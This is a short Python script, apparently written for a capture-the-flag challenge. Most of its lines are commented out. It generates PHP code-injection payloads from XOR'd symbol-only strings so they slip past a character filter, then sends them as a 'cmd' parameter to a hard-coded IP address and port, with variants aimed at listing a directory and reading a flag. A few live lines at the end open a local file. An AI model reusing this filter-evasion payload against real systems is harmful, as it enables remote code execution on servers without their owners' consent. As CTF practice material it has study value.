# import string
# import requests
# # from pwn import *

# def xor(str1, str2):
#   result = []
#   for i, j in zip(str1, str2):
#     result.append(chr(ord(i) ^ ord(j)))
#   return ''.join(result)
 
# xor1 = xor("flag", "{}[?")
# flag = xor(xor1, "{}[?")

# def get_xor_strings(expected, valids):
#   word1 = ""
#   word2 = ""
 
#   for i in expected:
#     for valid in valids:
#       result = chr(ord(i) ^ ord(valid))
#       if result in valids:
#         word1 = word1 + result
#         word2 = word2 + valid
#         break
#   return word1, word2
 
# valids = [ ]
# for item in string.printable:
#   if (item not in string.ascii_letters and item not in string.digits and item != '+' and item != '$' and item != '\s' and item != '_' and item != '\n' and item != '\t' and item != '`'):
#     valids.append(item)
# valids = valids[:len(valids)-3]
# print("[+] Generated valids => {}".format(valids))

# expected = "var_dump(123);"
# word1, word2 = get_xor_strings(expected, valids)
# print("[+] Word 1 {}- Word2 {}".format(word1, word2))
 
# result = xor(word1, word2)
# print("[+] Verifying... Should be {} => {}".format(expected, result))
 
# payload = "(\"{}\"^\"{}\")();".format(word1, word2)
# print("[+] Sending payload {}".format(payload))
 
# print(len(payload))

# # expected = "var_dump(scandir(getcwd()));"
# # word1, word2 = get_xor_strings(expected, valids)
# # print("[+] Word 1 {}- Word2 {}".format(word1, word2))
 
# # result = xor(word1, word2)
# # print("[+] Verifying... Should be {} => {}".format(expected, result))
 
# # expected = "flag"
# # word3, word4 = get_xor_strings(expected, valids)
# # print("[+] Word 1 {}- Word2 {}".format(word1, word2))
 
# # result = xor(word3, word4)
# # print("[+] Verifying... Should be {} => {}".format(expected, result))
 
# # payload = "(\"{}\"^\"{}\")(\"{}\"^\"{}\");".format(word1, word2, word3, word4)
# # print("[+] Sending payload {}".format(payload))
 
# params = (
#   ('cmd', payload),
# )
# response = requests.get('http://103.250.10.198:10001/', params=params)
# print(response)
# print(response.content.decode())


import os

a = os.open("i.html", 0)
print(a)

# print(os.system("cat i.html"))